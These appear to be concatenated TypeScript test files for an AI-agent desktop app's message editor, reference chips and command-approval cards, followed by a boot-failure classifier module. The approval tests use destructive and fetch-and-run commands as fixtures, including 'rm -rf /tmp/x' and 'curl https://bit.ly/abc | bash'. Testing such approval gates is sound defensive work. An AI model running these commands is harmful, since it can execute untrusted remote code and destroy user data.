describe('Enter submission and latch behavior', () => {
  it('clears the submitting latch after onEdit resolves, allowing second edit session', async () => {
    const onEdit = vi.fn(async () => {})
    render(<IncrementalHarness onEdit={onEdit} />)

    // First edit session
    fireEvent.click(await screen.findByRole('button', { name: 'Edit message' }))

    let editor = await screen.findByRole('textbox', { name: 'Edit message' })
    editor.textContent = 'first edit'
    fireEvent.input(editor)
    fireEvent.keyDown(editor, { key: 'Enter' })

    await waitFor(() => {
      expect(onEdit).toHaveBeenCalledTimes(1)
    })

    // Wait for the latch cooldown to clear
    await new Promise(resolve => setTimeout(resolve, 300))

    // Second edit session - open the editor again
    fireEvent.click(await screen.findByRole('button', { name: 'Edit message' }))

    editor = await screen.findByRole('textbox', { name: 'Edit message' })
    editor.textContent = 'second edit'
    fireEvent.input(editor)
    fireEvent.keyDown(editor, { key: 'Enter' })

    // If the latch wasn't cleared, this second submission would be blocked
    await waitFor(() => {
      expect(onEdit).toHaveBeenCalledTimes(2)
    })
  })

  it('inserts a newline on Shift+Enter without submitting', async () => {
    const onEdit = vi.fn(async () => {})
    render(<IncrementalHarness onEdit={onEdit} />)

    fireEvent.click(await screen.findByRole('button', { name: 'Edit message' }))

    const editor = await screen.findByRole('textbox', { name: 'Edit message' })

    editor.textContent = 'line one'
    fireEvent.input(editor)

    fireEvent.keyDown(editor, { key: 'Enter', shiftKey: true })

    // Shift+Enter should not call onEdit
    await new Promise(resolve => window.setTimeout(resolve, 50))
    expect(onEdit).not.toHaveBeenCalled()

    // The editor should allow the newline to be inserted (by not preventing default)
    // We don't simulate actual newline insertion here (requires complex DOM manipulation)
    // but we verify the guard did not block it
  })

  // Interleaving covered nowhere else: dirty edit → blur schedules the 80ms
  // cancel path → Enter submits before/after that timer. A torn-down composer
  // (cancel won) would drop the edit silently; a wedged submit latch would
  // leave the arrow dead. Issue #95798.
  it('submits a dirty edit when Enter interleaves with the blur-cancel timer', async () => {
    const uncaught: unknown[] = []

    const onUncaught = (err: unknown) => {
      uncaught.push(err)
    }

    process.on('uncaughtException', onUncaught)

    try {
      const onEdit = vi.fn(async () => {})
      const { container } = render(<IncrementalHarness onEdit={onEdit} />)

      fireEvent.click(await screen.findByRole('button', { name: 'Edit message' }))

      const editor = await screen.findByRole('textbox', { name: 'Edit message' })
      const editedText = 'dirty draft that must survive blur then submit'

      await act(async () => {
        editor.focus()
        editor.textContent = editedText
        fireEvent.input(editor)
      })

      // Blur without waiting — the 80ms cancel timer is now armed. Enter must
      // still land the edit even if the timer fires in the same window.
      await act(async () => {
        editor.blur()
        fireEvent.keyDown(editor, { key: 'Enter' })
        await new Promise(resolve => window.setTimeout(resolve, 200))
      })

      await waitFor(() => {
        expect(onEdit).toHaveBeenCalledTimes(1)
      })
      expect(onEdit).toHaveBeenCalledWith(
        expect.objectContaining({
          content: [{ text: editedText, type: 'text' }]
        })
      )
      expect(container.querySelector('[data-slot="aui_edit-composer-root"]')).toBeFalsy()
      expect(uncaught.filter(err => /Composer is not available/.test(String(err)))).toEqual([])
    } finally {
      process.off('uncaughtException', onUncaught)
    }
  })

  it('still submits after a dirty edit survived blur and focus left the composer', async () => {
    const onEdit = vi.fn(async () => {})
    const { container } = render(<IncrementalHarness onEdit={onEdit} />)

    fireEvent.click(await screen.findByRole('button', { name: 'Edit message' }))

    const editor = await screen.findByRole('textbox', { name: 'Edit message' })
    const editedText = 'edited after blur must still submit'

    editor.textContent = editedText
    fireEvent.input(editor)
    await moveFocusOutside(editor)

    expect(container.querySelector('[data-slot="aui_edit-composer-root"]')).toBeTruthy()

    fireEvent.keyDown(editor, { key: 'Enter' })

    await waitFor(() => {
      expect(onEdit).toHaveBeenCalledTimes(1)
    })
    expect(onEdit).toHaveBeenCalledWith(
      expect.objectContaining({
        content: [{ text: editedText, type: 'text' }]
      })
    )
  })
})

import { cleanup, render, screen } from '@testing-library/react'
import { afterEach, describe, expect, it } from 'vitest'

import { referenceRe, WIRE_REFERENCE_KINDS } from '@/components/assistant-ui/reference-kinds'

import { UserMessageText } from './user-message-text'

afterEach(cleanup)

/**
 * A sent reference must render as the chip the composer showed. These cover the
 * seam where that used to break: the value's quoting is directive syntax, and a
 * surface that reads it as markdown splits one reference into two wrong things.
 */
describe('a sent reference renders as the chip the composer showed', () => {
  it('chips a backtick-quoted @url: instead of splitting it into code', () => {
    render(
      <UserMessageText text="@url:`https://github.com/NousResearch/hermes-agent/pull/74790` urls lose formatting" />
    )

    expect(screen.queryByTitle('https://github.com/NousResearch/hermes-agent/pull/74790')).not.toBeNull()
    // The whole reference is one node — no bare `@url:` text left behind.
    expect(document.body.textContent).not.toContain('@url:')
  })

  it('chips a backtick-quoted @file: path with spaces', () => {
    render(<UserMessageText text="see @file:`apps/desktop/my notes.md` please" />)

    expect(screen.queryByTitle('apps/desktop/my notes.md')).not.toBeNull()
    expect(document.body.textContent).not.toContain('@file:')
  })

  it('labels a large-paste file as pasted content, keeping its path on hover', () => {
    const path = '/home/u/.hermes/attachments/pasted_content_2026-09-27_21-33-42-827_55e028-2.txt'

    render(<UserMessageText text={`@file:${path}`} />)

    expect(screen.getByTitle(path).textContent).toBe('Pasted content')
  })

  it('chips every kind that travels in message text', () => {
    // The guard against WIRE_REFERENCE_KINDS and the pattern's own alternation
    // drifting apart: add a kind to one and this fails until both agree.
    for (const kind of WIRE_REFERENCE_KINDS) {
      expect(`@${kind}:\`some value\``.match(referenceRe()), kind).toHaveLength(1)
    }
  })

  it('still renders a genuine code span as code', () => {
    render(<UserMessageText text="run `npm test` first" />)

    const code = document.querySelector('[data-slot="aui_user-inline-code"]')

    expect(code?.textContent).toBe('npm test')
  })

  it('renders code and a reference side by side', () => {
    render(<UserMessageText text="run `npm test` on @file:`apps/desktop/a b.ts` now" />)

    expect(document.querySelector('[data-slot="aui_user-inline-code"]')?.textContent).toBe('npm test')
    expect(screen.queryByTitle('apps/desktop/a b.ts')).not.toBeNull()
  })

  it('leaves a fenced block alone', () => {
    render(<UserMessageText text={'before\n```ts\nconst x = 1\n```\nafter'} />)

    const fence = document.querySelector('[data-slot="aui_user-fence"]')

    expect(fence?.textContent).toBe('const x = 1\n')
    // #70451: a wide user fence wraps inside the bubble instead of growing a
    // horizontal scrollbar under the transcript.
    expect(fence?.className).toContain('overflow-x-hidden')
    expect(fence?.className).toContain('whitespace-pre-wrap')
    expect(fence?.className).not.toContain('overflow-x-auto')
  })
})

import { AssistantRuntimeProvider, type ThreadMessage, useExternalStoreRuntime } from '@assistant-ui/react'
import { act, cleanup, fireEvent, render as renderUi, screen, waitFor } from '@testing-library/react'
import type { ReactNode } from 'react'
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'

import type { HermesGateway } from '@/hermes'
import { handleApprovalKey, releaseApprovalKey } from '@/lib/keybinds/approval-keys'
import { $gateway } from '@/store/gateway'
import {
  $approvalRequest,
  APPROVAL_RESPOND_REQUEST_TIMEOUT_MS,
  clearAllPrompts,
  sessionApprovalRequests,
  setApprovalRequest
} from '@/store/prompts'
import { hasOpenServerRequest, rememberServerRequest, resetServerRequestsForTests } from '@/store/server-requests'
import { $activeSessionId } from '@/store/session'
import { stubMenuDomApis, stubResizeObserver } from '@/test/jsdom'

import { PendingApprovalStack } from './approval'

function Runtime({ children }: { children: ReactNode }) {
  const runtime = useExternalStoreRuntime<ThreadMessage>({ messages: [], isRunning: false, onNew: async () => {} })

  return <AssistantRuntimeProvider runtime={runtime}>{children}</AssistantRuntimeProvider>
}

function render(children: ReactNode) {
  return renderUi(<Runtime>{children}</Runtime>)
}

beforeAll(() => {
  stubMenuDomApis()
  stubResizeObserver()
})

function setRequest(
  command = 'rm -rf /tmp/x',
  allowPermanent?: boolean,
  extra: { choices?: string[]; requestId?: string; serverRequestId?: string; smartDenied?: boolean } = {}
) {
  $activeSessionId.set('sess-1')
  setApprovalRequest({ allowPermanent, command, description: 'dangerous command', sessionId: 'sess-1', ...extra })
}

/** A live `approval` server request the card answers synchronously. */
function liveApproval(id = 'srq-approval') {
  const respond = vi.fn()
  rememberServerRequest({ fail: vi.fn(), id, method: 'approval', params: {}, respond })

  return respond
}

function mockGateway() {
  const request = vi.fn().mockResolvedValue({ resolved: true })
  $gateway.set({ request } as unknown as HermesGateway)

  return request
}

beforeEach(() => {
  resetServerRequestsForTests()
})

afterEach(() => {
  cleanup()
  releaseApprovalKey()
  clearAllPrompts()
  resetServerRequestsForTests()
  $activeSessionId.set(null)
  $gateway.set(null)
})

describe('PendingApprovalStack', () => {
  it('retains an empty host without consuming keyboard input', () => {
    const { container } = render(<PendingApprovalStack />)

    expect(container.querySelector('[data-approval-stack]')).not.toBeNull()
    expect(container.querySelector('[data-stack-active="true"]')).toBeNull()
    expect(handleApprovalKey(new KeyboardEvent('keydown', { key: 'Enter', cancelable: true }))).toBe(false)
  })

  it('renders run/reject controls for a pending terminal command', () => {
    setRequest('chmod -R 777 /tmp/x')
    render(<PendingApprovalStack />)

    expect(screen.getByRole('button', { name: /Run/ })).toBeTruthy()
    expect(screen.getByRole('button', { name: /Reject/ })).toBeTruthy()
  })

  it('renders the description instead of a synthetic plugin-rule placeholder', () => {
    // A pre_tool_call plugin returning {"action": "approve"} escalates through
    // the same gate with a synthetic display target; the real command lives in
    // the description. The card must show what would actually run.
    setRequest('<terminal> (plugin approval rule)', undefined, { requestId: 'apr-synth' })
    // setRequest stamps a generic description; overwrite with the plugin one.
    $approvalRequest.get() &&
      setApprovalRequest({
        command: '<terminal> (plugin approval rule)',
        description: 'Plugin requires approval for terminal: run\npwd',
        requestId: 'apr-synth',
        sessionId: 'sess-1'
      })
    render(<PendingApprovalStack />)

    expect(screen.getByText(/Plugin requires approval for terminal: run/)).toBeTruthy()
    expect(screen.getByText(/pwd/)).toBeTruthy()
    expect(screen.queryByText(/plugin approval rule/)).toBeNull()
  })

  it('keeps showing the real command for ordinary dangerous-command approvals', () => {
    setRequest('chmod -R 777 /tmp/x')
    render(<PendingApprovalStack />)

    expect(screen.getByText('chmod -R 777 /tmp/x')).toBeTruthy()
  })

  it('falls back to the description when a request carries no command at all', () => {
    setRequest('', undefined, { requestId: 'apr-nocmd' })
    setApprovalRequest({
      command: '',
      description: 'Approve config change: allow SSH tunnel',
      requestId: 'apr-nocmd',
      sessionId: 'sess-1'
    })
    render(<PendingApprovalStack />)

    expect(screen.getByText('Approve config change: allow SSH tunnel')).toBeTruthy()
  })

  it('answers the live approval request with {choice: "once"} and clears the request on Run', async () => {
    const request = mockGateway()
    const respond = liveApproval()
    setRequest('rm -rf /tmp/x', undefined, { requestId: 'apr-1', serverRequestId: 'srq-approval' })
    render(<PendingApprovalStack />)

    fireEvent.click(screen.getByRole('button', { name: /Run/ }))

    await waitFor(() => {
      expect(respond).toHaveBeenCalledWith({ choice: 'once' })
    })
    expect(hasOpenServerRequest('srq-approval')).toBe(false)
    expect(request).not.toHaveBeenCalledWith('approval.respond', expect.anything())
    expect($approvalRequest.get()).toBeNull()
  })

  it('hands focus back to the surface the user was in before clicking Run', async () => {
    mockGateway()
    liveApproval()
    setRequest('computer_use type', undefined, { requestId: 'apr-1', serverRequestId: 'srq-approval' })

    // The agent's preceding computer_use click left focus in the terminal pane.
    const terminal = document.createElement('textarea')
    const pane = document.createElement('div')
    pane.dataset.terminal = ''
    pane.append(terminal)
    document.body.append(pane)
    terminal.focus()

    try {
      render(<PendingApprovalStack />)
      const run = screen.getByRole('button', { name: /Run/ })

      // Chromium moves focus onto the pressed button before `click` fires.
      fireEvent.pointerDown(run)
      run.focus()
      fireEvent.click(run)

      await waitFor(() => {
        expect(hasOpenServerRequest('srq-approval')).toBe(false)
      })
      await waitFor(() => {
        expect(document.activeElement).toBe(terminal)
      })
    } finally {
      pane.remove()
    }
  })

  it('leaves focus alone when the user moved on before the approval settled', async () => {
    mockGateway()
    liveApproval()
    setRequest('computer_use type', undefined, { requestId: 'apr-1', serverRequestId: 'srq-approval' })

    const terminal = document.createElement('textarea')
    const elsewhere = document.createElement('input')
    document.body.append(terminal, elsewhere)
    terminal.focus()

    try {
      render(<PendingApprovalStack />)
      const run = screen.getByRole('button', { name: /Run/ })

      fireEvent.pointerDown(run)
      run.focus()
      fireEvent.click(run)
      elsewhere.focus()

      await waitFor(() => {
        expect(hasOpenServerRequest('srq-approval')).toBe(false)
      })
      await act(async () => {
        await Promise.resolve()
      })
      expect(document.activeElement).toBe(elsewhere)
    } finally {
      terminal.remove()
      elsewhere.remove()
    }
  })

  it('falls back to the approval.respond RPC when no live server request is registered', async () => {
    // A prompt restored from `approval.pending` (no socket carried the frame):
    // the queue-level RPC is the only way to answer it.
    const request = mockGateway()
    setRequest('rm -rf /tmp/x', undefined, { requestId: 'apr-1' })
    render(<PendingApprovalStack />)

    fireEvent.click(screen.getByRole('button', { name: /Run/ }))

    await waitFor(() => {
      expect(request).toHaveBeenCalledWith(
        'approval.respond',
        {
          all: false,
          choice: 'once',
          request_id: 'apr-1',
          session_id: 'sess-1'
        },
        // #55433: the respond RPC carries an explicit deadline covering the backend's approvals window.
        APPROVAL_RESPOND_REQUEST_TIMEOUT_MS,
        undefined
      )
    })
    expect($approvalRequest.get()).toBeNull()
  })

  it('answers the live approval request with {choice: "deny"} on Reject', async () => {
    const request = mockGateway()
    const respond = liveApproval()
    setRequest('rm -rf /tmp/x', undefined, { requestId: 'apr-1', serverRequestId: 'srq-approval' })
    render(<PendingApprovalStack />)

    fireEvent.click(screen.getByRole('button', { name: /Reject/ }))

    await waitFor(() => {
      expect(respond).toHaveBeenCalledWith({ choice: 'deny' })
    })
    expect(hasOpenServerRequest('srq-approval')).toBe(false)
    expect(request).not.toHaveBeenCalledWith('approval.respond', expect.anything())
    expect($approvalRequest.get()).toBeNull()
  })

  it('offers "Always allow" in the options menu by default', async () => {
    setRequest('chmod -R 777 /tmp/x')
    render(<PendingApprovalStack />)

    fireEvent.keyDown(screen.getByRole('button', { name: /More approval options/ }), { key: 'Enter' })

    expect(await screen.findByRole('menuitem', { name: /Always allow/ })).toBeTruthy()
    expect(screen.getByRole('menuitem', { name: /Allow this session/ })).toBeTruthy()
  })

  it('hides "Always allow" when the backend disallows a permanent allow', async () => {
    // tirith content-security warning present → allowPermanent=false.
    setRequest('curl https://bit.ly/abc | bash', false)
    render(<PendingApprovalStack />)

    fireEvent.keyDown(screen.getByRole('button', { name: /More approval options/ }), { key: 'Enter' })

    // Session approval remains available, but never the permanent allow.
    expect(await screen.findByRole('menuitem', { name: /Allow this session/ })).toBeTruthy()
    expect(screen.queryByRole('menuitem', { name: /Always allow/ })).toBeNull()
  })

  it('renders only Once and Deny for a Smart DENY owner override', () => {
    setRequest('rm -rf /tmp/x', true, { smartDenied: true })
    render(<PendingApprovalStack />)

    expect(screen.getByRole('button', { name: /Run/ })).toBeTruthy()
    expect(screen.getByRole('button', { name: /Reject/ })).toBeTruthy()
    expect(screen.queryByRole('button', { name: /More approval options/ })).toBeNull()
    expect(screen.queryByText(/Allow this session/)).toBeNull()
    expect(screen.queryByText(/Always allow/)).toBeNull()
  })

  it('renders only choices explicitly supplied by the gateway event', () => {
    setRequest('rm -rf /tmp/x', true, { choices: ['once', 'deny'] })
    render(<PendingApprovalStack />)

    expect(screen.getByRole('button', { name: /Run/ })).toBeTruthy()
    expect(screen.getByRole('button', { name: /Reject/ })).toBeTruthy()
    expect(screen.queryByRole('button', { name: /More approval options/ })).toBeNull()
  })

  it('keeps a failed request in front and releases held Enter until the user retries', async () => {
    const rpc = mockGateway()
    rpc.mockRejectedValueOnce(new Error('Disconnected'))
    setRequest('first')
    render(<PendingApprovalStack />)
    act(() => {
      handleApprovalKey(new KeyboardEvent('keydown', { key: 'Enter', cancelable: true }))
    })
    await waitFor(() => expect((screen.getByRole('button', { name: /Run/ }) as HTMLButtonElement).disabled).toBe(false))
    act(() => {
      handleApprovalKey(new KeyboardEvent('keydown', { key: 'Enter', repeat: true, cancelable: true }))
    })
    expect(rpc).toHaveBeenCalledTimes(1)
    expect($approvalRequest.get()?.command).toBe('first')
    fireEvent.click(screen.getByRole('button', { name: /Run/ }))
    await waitFor(() => expect($approvalRequest.get()).toBeNull())
  })

  it('drains exact cards with held Enter without answering a draft or background session', async () => {
    const rpc = mockGateway()
    $activeSessionId.set('sess-1')

    for (const id of ['a', 'b', 'c']) {
      setApprovalRequest({ command: id, description: id, requestId: id, sessionId: 'sess-1' })
    }

    setApprovalRequest({ command: 'background', description: 'background', requestId: 'other', sessionId: 'sess-2' })
    render(
      <>
        <PendingApprovalStack />
        <input aria-label="Draft" />
      </>
    )
    expect(screen.getAllByRole('button', { name: /Run/ })).toHaveLength(1)
    expect(document.querySelectorAll('[data-slot="card-stack-edge"]')).toHaveLength(1)
    const draft = screen.getByRole('textbox')
    fireEvent.change(draft, { target: { value: 'keep this' } })
    const typing = new KeyboardEvent('keydown', { key: 'Enter', bubbles: true, cancelable: true })
    draft.addEventListener('keydown', event => handleApprovalKey(event as KeyboardEvent))
    fireEvent(draft, typing)
    expect(rpc).not.toHaveBeenCalled()

    for (const [index, id] of ['a', 'b', 'c'].entries()) {
      act(() => {
        handleApprovalKey(new KeyboardEvent('keydown', { key: 'Enter', repeat: index > 0, cancelable: true }))
      })
      await waitFor(() =>
        expect(rpc).toHaveBeenCalledWith(
          'approval.respond',
          {
            all: false,
            choice: 'once',
            request_id: id,
            session_id: 'sess-1'
          },
          // #55433: the respond RPC carries an explicit deadline covering the backend's approvals window.
          APPROVAL_RESPOND_REQUEST_TIMEOUT_MS,
          undefined
        )
      )
      await waitFor(() => expect(screen.queryAllByRole('button', { name: /Run/ })).toHaveLength(index === 2 ? 0 : 1))
    }

    releaseApprovalKey()
    expect(rpc.mock.calls.filter(([method]) => method === 'approval.respond')).toHaveLength(3)
    expect(
      sessionApprovalRequests('sess-2')
        .get()
        .map(request => request.requestId)
    ).toEqual(['other'])
    expect((draft as HTMLInputElement).value).toBe('keep this')
  })

  it('answers only the front live server request on each held Enter event', async () => {
    const rpc = mockGateway()
    const responses = ['a', 'b', 'c'].map(id => ({ id, respond: liveApproval(`srq-${id}`) }))
    $activeSessionId.set('sess-1')

    for (const { id } of responses) {
      setApprovalRequest({
        command: id,
        description: id,
        requestId: id,
        serverRequestId: `srq-${id}`,
        sessionId: 'sess-1'
      })
    }

    render(<PendingApprovalStack />)

    for (const [index, { id, respond }] of responses.entries()) {
      act(() => {
        handleApprovalKey(new KeyboardEvent('keydown', { key: 'Enter', repeat: index > 0, cancelable: true }))
      })
      await waitFor(() => expect(respond).toHaveBeenCalledExactlyOnceWith({ choice: 'once' }))
      expect(hasOpenServerRequest(`srq-${id}`)).toBe(false)

      for (const next of responses.slice(index + 1)) {
        expect(next.respond).not.toHaveBeenCalled()
        expect(hasOpenServerRequest(`srq-${next.id}`)).toBe(true)
      }

      await waitFor(() =>
        expect(screen.queryAllByRole('button', { name: /Run/ })).toHaveLength(index === responses.length - 1 ? 0 : 1)
      )
    }

    expect(rpc).not.toHaveBeenCalledWith('approval.respond', expect.anything())
    expect($approvalRequest.get()).toBeNull()
  })
})

output:
/**
 * Plain-language cause for a LOCAL backend boot failure. The main process
 * reports what it saw ("exited before it became ready (1)", "Timed out
 * connecting to Hermes backend after 45000ms", an EACCES, a Python traceback
 * tail…). None of that tells a non-developer what went wrong, so the overlay
 * leads with one classified sentence and keeps the raw text behind
 * "Show recent logs". Pure, table-driven, unit-tested without React.
 *
 * SSH and remote-reauth failures have their own classifiers
 * (`sshFailureMessage`, `isRemoteReauthFailure`) and are not handled here.
 */

export type LocalBootCause =
  | 'antivirusQuarantine'
  | 'corruptedState'
  | 'crashLoop'
  | 'diskFull'
  | 'exitedEarly'
  | 'installMissing'
  | 'permission'
  | 'portInUse'
  | 'timedOut'
  | 'windowsStoreAlias'

export interface CauseResolution {
  headline: string
  nextAction: string
}

export const DEFAULT_CAUSE_RESOLUTIONS: Record<LocalBootCause, CauseResolution> = {
  windowsStoreAlias: {
    headline: 'Windows App Execution Alias intercepted Python (exit code 9009).',
    nextAction: 'Install Python 3.11+ from python.org or disable the Windows Store execution alias in Windows Settings.'
  },
  antivirusQuarantine: {
    headline: 'Antivirus software quarantined or blocked an application component.',
    nextAction: 'Restore the quarantined file in your antivirus settings or add an exception for Aro, then click Retry.'
  },
  corruptedState: {
    headline: 'Application state or database file is corrupted.',
    nextAction: 'Repair the installation or remove the corrupted database file from your Aro data directory.'
  },
  crashLoop: {
    headline: 'Backend gateway is stuck in a crash loop.',
    nextAction: 'Inspect recent logs below, copy diagnostics, and try repairing the local environment.'
  },
  diskFull: {
    headline: 'No space left on device (disk is full).',
    nextAction: 'Free up disk space on your drive and restart the application.'
  },
  permission: {
    headline: 'Permission denied while accessing application files.',
    nextAction: 'Check file permissions for your user profile directory and run Aro as a standard user.'
  },
  portInUse: {
    headline: 'Network port is already in use by another application.',
    nextAction: 'Close other running instances or applications occupying the port, then click Retry.'
  },
  installMissing: {
    headline: 'Aro runtime files or environment are missing or damaged.',
    nextAction: 'Choose "Repair install" to recreate the runtime environment.'
  },
  timedOut: {
    headline: 'Local backend timed out connecting to the gateway.',
    nextAction: 'Check system load and click Retry to give the backend another opportunity to boot.'
  },
  exitedEarly: {
    headline: 'Local backend process exited unexpectedly during startup.',
    nextAction: 'View the recent logs below or copy diagnostics to investigate the error.'
  }
}

// Order matters: the more specific causes (disk, permission, port, missing
// install, windows store stub, antivirus, corruption, crash loops) are checked
// before the generic exit/timeout shapes that usually accompany them in the same output.
const CAUSE_PATTERNS: readonly [LocalBootCause, RegExp][] = [
  ['windowsStoreAlias', /9009|microsoft store|manage app execution aliases/i],
  ['antivirusQuarantine', /quarantine|threat detected|blocked by administrator|operation did not complete successfully because the file contains a virus/i],
  ['corruptedState', /database disk image is malformed|sqlite3\.DatabaseError|corrupt|database is locked|file is not a database/i],
  ['crashLoop', /crash loop|crashed repeatedly|restarting too quickly|exited repeatedly|restart count exceeded/i],
  ['diskFull', /no space left on device|database or disk is full|\bENOSPC\b|disk full/i],
  ['permission', /permission denied|\bEACCES\b|\bEPERM\b|read-only file system|\bEROFS\b|operation not permitted/i],
  ['portInUse', /address already in use|\bEADDRINUSE\b|port .* (?:is )?(?:already )?in use/i],
  [
    'installMissing',
    /installation is missing|is missing or incomplete|missing or damaged|venv missing|no module named|modulenotfounderror/i
  ],
  ['timedOut', /timed out|timeout/i],
  ['exitedEarly', /exited before|exited \(|process exited|exited with|traceback \(most recent call last\)/i]
]

export function classifyLocalBootFailure(error: string | null | undefined): LocalBootCause | null {
  const text = String(error || '')

  if (!text) {
    return null
  }

  return CAUSE_PATTERNS.find(([, pattern]) => pattern.test(text))?.[0] ?? null
}

export interface LocalBootFailureCopy {
  /** The one classified sentence shown in the red box. */
  headline: string
  /** Concrete next action for the user to resolve this failure. */
  nextAction?: string | null
  /** Raw error text worth keeping for the collapsed details — null when the
   *  raw text is short enough that the headline already carries it. */
  rawDetail: string | null
}

/** Copy for the overlay's red box: a classified cause when one is known,
 *  otherwise the raw error's FIRST line (never a traceback dump). */
export function localBootFailureCopy(
  error: string | null | undefined,
  causes: Partial<Record<LocalBootCause, string>>
): LocalBootFailureCopy {
  const raw = String(error || '').trim()
  const cause = classifyLocalBootFailure(raw)

  if (cause) {
    const resolution = DEFAULT_CAUSE_RESOLUTIONS[cause]
    const headline = causes[cause] ?? resolution.headline
    const nextAction = resolution.nextAction

    return { headline, nextAction, rawDetail: raw || null }
  }

  const firstLine = raw.split('\n')[0]?.trim() ?? ''

  return { headline: firstLine, nextAction: null, rawDetail: firstLine === raw ? null : raw }
}

